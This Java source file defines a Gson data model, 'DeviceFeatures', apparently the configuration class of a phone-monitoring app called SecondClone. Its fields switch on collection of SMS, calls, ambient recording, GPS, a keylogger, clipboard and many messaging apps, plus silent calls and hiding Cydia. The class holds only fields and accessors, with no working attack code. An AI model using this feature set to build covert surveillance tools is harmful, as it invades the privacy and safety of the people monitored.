package com.jexpa.secondclone.Model;

/**
 * Author: Lucaswalker@jexpa.com
 * Class: DeviceFeatures
 * History: 8/5/2020
 * Project: SecondClone
 */

import com.google.gson.annotations.Expose;
import com.google.gson.annotations.SerializedName;

import java.io.Serializable;

public class DeviceFeatures implements Serializable {

    @SerializedName("ID")
    @Expose
    private Integer ID;
    @SerializedName("Device_ID")
    @Expose
    private String device_ID;
    @SerializedName("Calendar")
    @Expose
    private Integer calendar;
    @SerializedName("SMS")
    @Expose
    private Integer sMS;
    @SerializedName("Call")
    @Expose
    private Integer call;
    @SerializedName("GPS")
    @Expose
    private Integer gPS;
    @SerializedName("GPS_Interval")
    @Expose
    private Integer gPS_Interval;
    @SerializedName("Report_Interval")
    @Expose
    private Integer report_Interval;
    @SerializedName("URL")
    @Expose
    private Integer uRL;
    @SerializedName("Email")
    @Expose
    private Integer email;
    @SerializedName("Contact")
    @Expose
    private Integer contact;
    @SerializedName("Photo")
    @Expose
    private Integer photo;
    @SerializedName("App")
    @Expose
    private Integer app;
    @SerializedName("App_Installation")
    @Expose
    private Integer app_Installation;
    @SerializedName("Recorded_Call")
    @Expose
    private Integer recorded_Call;
    @SerializedName("Note")
    @Expose
    private Integer note;
    @SerializedName("Video")
    @Expose
    private Integer video;
    @SerializedName("Voice_Memos")
    @Expose
    private Integer voice_Memos;
    @SerializedName("Ambient_Record")
    @Expose
    private Integer ambient_Record;
    @SerializedName("Ambient_Record_Duration")
    @Expose
    private Integer ambient_Record_Duration;
    @SerializedName("WhatsApp")
    @Expose
    private Integer whatApp;
    @SerializedName("Yahoo")
    @Expose
    private Integer yahoo;
    @SerializedName("KeyLogger")
    @Expose
    private Integer keyLogger;
    @SerializedName("Notification")
    @Expose
    private Integer notification;
    @SerializedName("Secret_Key")
    @Expose
    private String secret_Key;
    @SerializedName("Viber")
    @Expose
    private Integer viber;
    @SerializedName("Tango")
    @Expose
    private Integer tango;
    @SerializedName("Wechat")
    @Expose
    private Integer wechat;
    @SerializedName("Facebook")
    @Expose
    private Integer facebook;
    @SerializedName("Ola")
    @Expose
    private Integer ola;
    @SerializedName("Skype")
    @Expose
    private Integer skype;
    @SerializedName("Hangouts")
    @Expose
    private Integer hangouts;
    @SerializedName("Bbm")
    @Expose
    private Integer bbm;
    @SerializedName("Line")
    @Expose
    private Integer line;
    @SerializedName("Kik")
    @Expose
    private Integer kik;
    @SerializedName("Twitter")
    @Expose
    private Integer twitter;
    @SerializedName("Instagram")
    @Expose
    private Integer instagram;
    @SerializedName("Snapchat")
    @Expose
    private Integer snapchat;
    @SerializedName("Horizontal")
    @Expose
    private Integer horizontal;
    @SerializedName("Vertical")
    @Expose
    private Integer vertical;
    @SerializedName("Monitor_Number")
    @Expose
    private String monitor_Number;
    @SerializedName("Admin_Number")
    @Expose
    private String admin_Number;
    @SerializedName("Auto_Upgrade")
    @Expose
    private Integer auto_Upgrade;
    @SerializedName("Uninstall")
    @Expose
    private Integer uninstall;
    @SerializedName("URL_Server")
    @Expose
    private String uRL_Server;
    @SerializedName("Flush_Data_Even_Expired")
    @Expose
    private Integer flush_Data_Even_Expired;
    @SerializedName("Delivery_Logs_By_Email")
    @Expose
    private Integer delivery_Logs_By_Email;
    @SerializedName("Report_Problem")
    @Expose
    private Integer report_Problem;
    @SerializedName("Level_Log_File")
    @Expose
    private Integer level_Log_File;
    @SerializedName("Save_Battery")
    @Expose
    private Integer save_Battery;
    @SerializedName("Connection_Type")
    @Expose
    private String connection_Type;
    @SerializedName("ServerTime")
    @Expose
    private String serverTime;
    @SerializedName("Client_Date")
    @Expose
    private String client_Date;
    @SerializedName("Silent_Call")
    @Expose
    private Integer silent_Call;
    @SerializedName("Run_Mode")
    @Expose
    private Integer run_Mode;
    @SerializedName("Exportcsv")
    @Expose
    private Integer exportcsv;
    @SerializedName("Hide_Cydia")
    @Expose
    private Integer hide_Cydia;
    @SerializedName("Modified_Date")
    @Expose
    private String modified_Date;
    @SerializedName("Modified_By")
    @Expose
    private Integer modified_By;
    @SerializedName("Created_Date")
    @Expose
    private String created_Date;
    @SerializedName("Created_By")
    @Expose
    private Integer created_By;
    @SerializedName("Deliverry_To_Email")
    @Expose
    private String deliverry_To_Email;
    @SerializedName("Network_Connection")
    @Expose
    private Integer network_Connection;
    @SerializedName("Clipboard")
    @Expose
    private Integer clipboard;
    @SerializedName("Alert")
    @Expose
    private Integer alert;

    public DeviceFeatures() {
    }

    public Integer getID() {
        return ID;
    }

    public void setID(Integer ID) {
        this.ID = ID;
    }

    public String getDevice_ID() {
        return device_ID;
    }

    public void setDevice_ID(String device_ID) {
        this.device_ID = device_ID;
    }

    public Integer getCalendar() {
        return calendar;
    }

    public void setCalendar(Integer calendar) {
        this.calendar = calendar;
    }

    public Integer getsMS() {
        return sMS;
    }

    public void setsMS(Integer sMS) {
        this.sMS = sMS;
    }

    public Integer getCall() {
        return call;
    }

    public void setCall(Integer call) {
        this.call = call;
    }

    public Integer getgPS() {
        return gPS;
    }

    public void setgPS(Integer gPS) {
        this.gPS = gPS;
    }

    public Integer getgPS_Interval() {
        return gPS_Interval;
    }

    public void setgPS_Interval(Integer gPS_Interval) {
        this.gPS_Interval = gPS_Interval;
    }

    public Integer getReport_Interval() {
        return report_Interval;
    }

    public void setReport_Interval(Integer report_Interval) {
        this.report_Interval = report_Interval;
    }

    public Integer getuRL() {
        return uRL;
    }

    public void setuRL(Integer uRL) {
        this.uRL = uRL;
    }

    public Integer getEmail() {
        return email;
    }

    public void setEmail(Integer email) {
        this.email = email;
    }

    public Integer getContact() {
        return contact;
    }

    public void setContact(Integer contact) {
        this.contact = contact;
    }

    public Integer getPhoto() {
        return photo;
    }

    public void setPhoto(Integer photo) {
        this.photo = photo;
    }

    public Integer getApp() {
        return app;
    }

    public void setApp(Integer app) {
        this.app = app;
    }

    public Integer getApp_Installation() {
        return app_Installation;
    }

    public void setApp_Installation(Integer app_Installation) {
        this.app_Installation = app_Installation;
    }

    public Integer getRecorded_Call() {
        return recorded_Call;
    }

    public void setRecorded_Call(Integer recorded_Call) {
        this.recorded_Call = recorded_Call;
    }

    public Integer getNote() {
        return note;
    }

    public void setNote(Integer note) {
        this.note = note;
    }

    public Integer getVideo() {
        return video;
    }

    public void setVideo(Integer video) {
        this.video = video;
    }

    public Integer getVoice_Memos() {
        return voice_Memos;
    }

    public void setVoice_Memos(Integer voice_Memos) {
        this.voice_Memos = voice_Memos;
    }

    public Integer getAmbient_Record() {
        return ambient_Record;
    }

    public void setAmbient_Record(Integer ambient_Record) {
        this.ambient_Record = ambient_Record;
    }

    public Integer getAmbient_Record_Duration() {
        return ambient_Record_Duration;
    }

    public void setAmbient_Record_Duration(Integer ambient_Record_Duration) {
        this.ambient_Record_Duration = ambient_Record_Duration;
    }

    public Integer getWhatApp() {
        return whatApp;
    }

    public void setWhatApp(Integer whatApp) {
        this.whatApp = whatApp;
    }

    public Integer getYahoo() {
        return yahoo;
    }

    public void setYahoo(Integer yahoo) {
        this.yahoo = yahoo;
    }

    public Integer getKeyLogger() {
        return keyLogger;
    }

    public void setKeyLogger(Integer keyLogger) {
        this.keyLogger = keyLogger;
    }

    public Integer getNotification() {
        return notification;
    }

    public void setNotification(Integer notification) {
        this.notification = notification;
    }

    public String getSecret_Key() {
        return secret_Key;
    }

    public void setSecret_Key(String secret_Key) {
        this.secret_Key = secret_Key;
    }

    public Integer getViber() {
        return viber;
    }

    public void setViber(Integer viber) {
        this.viber = viber;
    }

    public Integer getTango() {
        return tango;
    }

    public void setTango(Integer tango) {
        this.tango = tango;
    }

    public Integer getWechat() {
        return wechat;
    }

    public void setWechat(Integer wechat) {
        this.wechat = wechat;
    }

    public Integer getFacebook() {
        return facebook;
    }

    public void setFacebook(Integer facebook) {
        this.facebook = facebook;
    }

    public Integer getOla() {
        return ola;
    }

    public void setOla(Integer ola) {
        this.ola = ola;
    }

    public Integer getSkype() {
        return skype;
    }

    public void setSkype(Integer skype) {
        this.skype = skype;
    }

    public Integer getHangouts() {
        return hangouts;
    }

    public void setHangouts(Integer hangouts) {
        this.hangouts = hangouts;
    }

    public Integer getBbm() {
        return bbm;
    }

    public void setBbm(Integer bbm) {
        this.bbm = bbm;
    }

    public Integer getLine() {
        return line;
    }

    public void setLine(Integer line) {
        this.line = line;
    }

    public Integer getKik() {
        return kik;
    }

    public void setKik(Integer kik) {
        this.kik = kik;
    }

    public Integer getTwitter() {
        return twitter;
    }

    public void setTwitter(Integer twitter) {
        this.twitter = twitter;
    }

    public Integer getInstagram() {
        return instagram;
    }

    public void setInstagram(Integer instagram) {
        this.instagram = instagram;
    }

    public Integer getSnapchat() {
        return snapchat;
    }

    public void setSnapchat(Integer snapchat) {
        this.snapchat = snapchat;
    }

    public Integer getHorizontal() {
        return horizontal;
    }

    public void setHorizontal(Integer horizontal) {
        this.horizontal = horizontal;
    }

    public Integer getVertical() {
        return vertical;
    }

    public void setVertical(Integer vertical) {
        this.vertical = vertical;
    }

    public String getMonitor_Number() {
        return monitor_Number;
    }

    public void setMonitor_Number(String monitor_Number) {
        this.monitor_Number = monitor_Number;
    }

    public String getAdmin_Number() {
        return admin_Number;
    }

    public void setAdmin_Number(String admin_Number) {
        this.admin_Number = admin_Number;
    }

    public Integer getAuto_Upgrade() {
        return auto_Upgrade;
    }

    public void setAuto_Upgrade(Integer auto_Upgrade) {
        this.auto_Upgrade = auto_Upgrade;
    }

    public Integer getUninstall() {
        return uninstall;
    }

    public void setUninstall(Integer uninstall) {
        this.uninstall = uninstall;
    }

    public String getuRL_Server() {
        return uRL_Server;
    }

    public void setuRL_Server(String uRL_Server) {
        this.uRL_Server = uRL_Server;
    }

    public Integer getFlush_Data_Even_Expired() {
        return flush_Data_Even_Expired;
    }

    public void setFlush_Data_Even_Expired(Integer flush_Data_Even_Expired) {
        this.flush_Data_Even_Expired = flush_Data_Even_Expired;
    }

    public Integer getDelivery_Logs_By_Email() {
        return delivery_Logs_By_Email;
    }

    public void setDelivery_Logs_By_Email(Integer delivery_Logs_By_Email) {
        this.delivery_Logs_By_Email = delivery_Logs_By_Email;
    }

    public Integer getReport_Problem() {
        return report_Problem;
    }

    public void setReport_Problem(Integer report_Problem) {
        this.report_Problem = report_Problem;
    }

    public Integer getLevel_Log_File() {
        return level_Log_File;
    }

    public void setLevel_Log_File(Integer level_Log_File) {
        this.level_Log_File = level_Log_File;
    }

    public Integer getSave_Battery() {
        return save_Battery;
    }

    public void setSave_Battery(Integer save_Battery) {
        this.save_Battery = save_Battery;
    }

    public String getConnection_Type() {
        return connection_Type;
    }

    public void setConnection_Type(String connection_Type) {
        this.connection_Type = connection_Type;
    }

    public String getServerTime() {
        return serverTime;
    }

    public void setServerTime(String serverTime) {
        this.serverTime = serverTime;
    }

    public String getClient_Date() {
        return client_Date;
    }

    public void setClient_Date(String client_Date) {
        this.client_Date = client_Date;
    }

    public Integer getSilent_Call() {
        return silent_Call;
    }

    public void setSilent_Call(Integer silent_Call) {
        this.silent_Call = silent_Call;
    }

    public Integer getRun_Mode() {
        return run_Mode;
    }

    public void setRun_Mode(Integer run_Mode) {
        this.run_Mode = run_Mode;
    }

    public Integer getExportcsv() {
        return exportcsv;
    }

    public void setExportcsv(Integer exportcsv) {
        this.exportcsv = exportcsv;
    }

    public Integer getHide_Cydia() {
        return hide_Cydia;
    }

    public void setHide_Cydia(Integer hide_Cydia) {
        this.hide_Cydia = hide_Cydia;
    }

    public String getModified_Date() {
        return modified_Date;
    }

    public void setModified_Date(String modified_Date) {
        this.modified_Date = modified_Date;
    }

    public Integer getModified_By() {
        return modified_By;
    }

    public void setModified_By(Integer modified_By) {
        this.modified_By = modified_By;
    }

    public String getCreated_Date() {
        return created_Date;
    }

    public void setCreated_Date(String created_Date) {
        this.created_Date = created_Date;
    }

    public Integer getCreated_By() {
        return created_By;
    }

    public void setCreated_By(Integer created_By) {
        this.created_By = created_By;
    }

    public String getDeliverry_To_Email() {
        return deliverry_To_Email;
    }

    public void setDeliverry_To_Email(String deliverry_To_Email) {
        this.deliverry_To_Email = deliverry_To_Email;
    }

    public Integer getNetwork_Connection() {
        return network_Connection;
    }

    public void setNetwork_Connection(Integer network_Connection) {
        this.network_Connection = network_Connection;
    }

    public Integer getClipboard() {
        return clipboard;
    }

    public void setClipboard(Integer clipboard) {
        this.clipboard = clipboard;
    }

    public Integer getAlert() {
        return alert;
    }

    public void setAlert(Integer alert) {
        this.alert = alert;
    }
}